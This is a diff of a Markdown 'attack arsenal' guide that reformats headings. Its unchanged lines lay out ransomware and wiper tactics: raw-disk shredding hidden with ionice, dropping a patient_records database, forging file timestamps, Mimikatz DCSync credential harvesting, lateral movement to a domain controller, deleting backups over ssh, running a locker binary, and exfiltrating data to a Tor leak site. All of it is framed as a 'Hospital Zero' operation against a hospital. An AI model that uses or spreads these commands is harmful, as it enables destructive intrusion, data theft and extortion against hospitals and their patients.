@@ -10,7 +10,7 @@
 
 ## Attack arsenal
 
-1. AI-Optimized ransomware (LockBit 5.0 Protocol)
+### AI-Optimized ransomware (LockBit 5.0 Protocol)
 
 Adaptive encryption engine:
 
@@ -28,7 +28,7 @@ Triple extortion playbook:
 * [exfiltrate](exfiltration.md) to private Tor-based leak site
 * Threaten volumetric DDoS during negotiations
 
-2. Hybrid Wiper-Ransomware (Blackout Worm variants)
+### Hybrid Wiper-Ransomware (Blackout Worm variants)
 
 Execution Flow:
 
@@ -42,7 +42,7 @@ shred -n 10 -u /dev/sdX  # DoD 7-pass equivalent
 
 Use `ionice -c 3` to reduce disk I/O visibility during shredding.
 
-3. Critical Infrastructure Sabotage
+### Critical infrastructure sabotage
 
 SCADA/ICS killswitch:
 
@@ -57,7 +57,7 @@ Database annihilation:
     DROP DATABASE patient_records WITH NORECOVERY;  # SQL Server persistent damage
 ```
 
-4. Forensic countermeasures
+### Forensic countermeasures
 
 Log Obliteration Kit:
 
@@ -78,12 +78,12 @@ touch -r /etc/passwd malicious_file  # Inherits timestamps from legitimate file
 
 ## Red team exercise: "Hospital Zero" (2025)
 
-Phase 1: Infiltration
+**Phase 1: Infiltration**
 
 * Delivery: Malicious ISO masquerading as "Patient_Scan_2987.iso"
 * Exploit: CLFS zero-day (CVE-2025-29824) → NT AUTHORITY\SYSTEM
 
-Phase 2: Domain Dominance
+**Phase 2: Domain dominance**
 
 ```powershell
 # Credential Harvesting
@@ -93,7 +93,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.hospital /user:Administr
 Enter-PSSession -ComputerName DC01 -Credential $creds -Authentication Negotiate
 ```
 
-Phase 3: Surgical Strikes
+**Phase 3: Surgical strikes**
 
 ```bash
 # Backup Neutralization
@@ -103,7 +103,7 @@ ssh backupadmin@veeam01 "sudo rm -rf /backups/archive/* --no-preserve-root"
 .\locker.exe --config config.json --timeout 900  # 15-minute encryption sprint
 ```
 
-Phase 4: Extortion
+***Phase 4: Extortion***
 
 Negotiation channels:
 
